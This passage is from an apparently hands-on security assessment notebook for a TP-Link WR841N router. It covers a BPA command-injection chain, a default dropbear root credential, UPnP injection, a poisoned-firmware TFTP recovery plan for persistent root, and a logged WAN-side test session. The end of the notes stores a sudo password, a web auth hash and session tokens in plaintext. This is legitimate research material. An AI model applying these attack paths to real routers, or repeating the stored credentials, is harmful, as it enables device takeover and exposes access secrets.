- The firmware contains the **exact flash structure** for 160325 (we have the OEM image + its squashfs layout in `/tmp/fw/root`), so re-packing + header/checksum fix is tractable; board u-boot normally does not verify a TP-Link signature for recovery images on WR841N v11 (u-boot tftp load).
- Not attempted yet — only a contingency if all other paths fail. This yields **PERSISTENT root** (patch survives boot), the strongest outcome, at the cost of altering on-device firmware (requires physical access + recovery-sequence timing).

---

## 20. Updated Live-Test Priorities (2026-09-12 post-analysis)

1. **BPA cmd injection (Sec 17)** — the leading candidate. Needs: re-login token (done), switch WAN type to BPA (disruptive, coordinate), host TFTP listener armed, payload in `usr`/`AuthSrv`, then trigger DHCP-OK link-up; watch `tftp.log`. If web drops (single worker), power-cycle to restore.
2. **dropbear `root:sohoadmin`** — 2012.55 running on 22/tcp; retry SSH with `-oKexAlgorithms=diffie-hellman-group14-sha1` + askpass; `exec request failed` previously (no admin in /tmp/passwd) but root line may differ. Worth one clean shot.
3. **UPnP IGD SOAP (1900)** — unauthenticated; dest IP -> `iptables ... -d %s` — pipes/sockets confirmed, low-priority once BPA/dropbear done.
4. **ART TKIP mode trigger** — factory path; needs LED/reset probe. Deferred (Sec 3).
5. ~~Diagnostic ping~~ REFUTED (Sec 15). ~~PPTP~~ REFUTED (Sec 18). ~~SSID~~ REFUTED (Sec 4).

---

## 21. Update Record

- 2026-09-12: Sec 15 corrected (web diagnostic = raw-socket, the ping6 `system()` sink only exists in the hardcoded IPv6-check path; prior attribution wrong). Sec 17 BPA chain mapped end-to-end. Sec 18 PPTP refuted. Sec 19 backup TFTP-recovery plan recorded. Sec 20 priorities revised.
- 2026-09-12 (pm): Sec 22 live WAN-side session added (dual-stack dnsmasq + RA/DHCPv6 + TFTP on eth1; router silent; no callback). Proc table at 0x409da8 resolved — event `0x1200000a` = shared periodic/second-tick family, `bpaStartAfterDhcpOk` execs only when BPA link is DOWN. Evidence copied to `evidence/live_wan/`.

---

## 22. Live WAN-side Session Wrap-Up (2026-09-12, end of day)

**Setup at close:** router WAN port connected directly to host eth1; eth1 up, link local IPv6 `fe80::5054:ff:feb1:10c4/64`, ULA `fd00::100/64` assigned; dnsmasq 2.93 running detached (pid 167918) serving on eth1: IPv4 DHCP (192.168.0.50-100) + IPv6 DHCPv6 range `::50-::ff` (constructor:eth1) + RA `enable-ra` (advertising `fd00::`); TFTP listener (pid 137207) up on 0.0.0.0:69; dnsmasq leases at `/var/lib/misc/dnsmasq.leases`; logs `/tmp/routerenum/{dnsmasq,tftp,tcpdump}.log`. WAN link flapped once (eth1 down/up) to try to force the router's link-up event.

**New empirical facts (2026-09-12 evening):**
- Router WAN (MAC 98:DE:D0:D4:05:C7, TP-Link OUI) answers ICMPv6 on the WAN port — link is genuinely plugged in and healthy.
- The router sends **IPv6 link-local ND + link-local ping replies only**. Once our RA was served it went **silent**: no repeat RS, no DHCPv6 SOLICIT, no IPv4 DISCOVER. The only DHCPv6 SOLICIT/BOOTP-DHCP traffic on the wire during our 60s captures came from **our own host** (NM client on eth1), NOT the router.
- The router never asked for IPv4 DHCP at all on the WAN side (consistent with user's earlier host capture: DHCPv6 solicit + RS, zero IPv4 DISCOVER).
- The single DUID in dnsmasq.leases is our own QEMU nic (52:54:00:40:5c:3c), not the router. No TFTP callback hit. Event `0x1200000a` handler list at 0x409da8 confirmed to include `bpaStartAfterDhcpOk` (name block base file 0x181c8, entry names: GetSysTimeInSecond/tSubscriptionSID/etc — a periodic/second-tick event family), strongly suggesting **0x1200000a is the shared periodic-second event path**, not specifically "IPv4 DHCP-OK".
- `bpaStartAfterDhcpOk` (0x4e4934) semantics clarified from disasm: on event, it calls `swBpaIsLinkUp()`; if link is ALREADY UP it returns **without exec**. Exec path (apply static WAN ifconfig/netmask/nameserver + `fcn.004e46a4` builder -> `tp_systemEx`) runs only when the **BPA link is DOWN**. So the trigger requirement is: event fires while BPA link = down.

**Implications for next session:**
- Honest status: the BPA web-side injection is still **static-proven, live-trigger NOT yet achieved**. The trigger mechanism (which event sends 0x1200000a to 0x409da8 handlers, and whether it fires on this unit) remains unconfirmed.
- The router's WAN never initiating IPv4 DHCP under factory-reset state is itself unexplained — candidate causes: (a) wantype reset to something non-DHCpc, (b) BPA link-UP check gate never satisfiable without a live cable ISP, (c) event 0x1200000a never fired because DHCP never completed. Needs a boot-capture to see if udhcpc runs.
- **Recommended next actions:** (1) boot-capture WAN traffic from power-on to see if udhcpc/dhcp6c ever start; (2) confirm current wantype cookie over LAN (cable to LAN1) to verify saved state survived; (3) test whether a *physical WAN replug* (not host-side flap) triggers the router's link-up state machine; (4) if DHCP event path proves unfireable on bench, fall back to Sec 19 (poisoned-stock-firmware TFTP recovery) or dropbear/ART routes.

**Session artifacts kept for continuity:** `/tmp/routerenum/` — dnsmasq.conf/launch_dnsmasq.sh (launch via `sh /tmp/routerenum/launch_dnsmasq.sh`; do NOT use systemd-run, it gets SIGTERM'd; do NOT `pkill -f dnsmasq` from a shell whose own cmdline contains the word), tftp_listen.py/tftpd flags, wan_cap.pcap, logs. Sudo password `420696`. Web Basic auth `admin:21232f297a57a5a743894a0e4a801fc3`; tokens last used `UVRKANOAYJIZMRGB` (LAN-side). WAN cable = eth1 (currently still on WAN port).
A full copy of this session's artifacts + a write-up now also live in the report: `evidence/live_wan/` (see `live_wan_session_summary.md`).
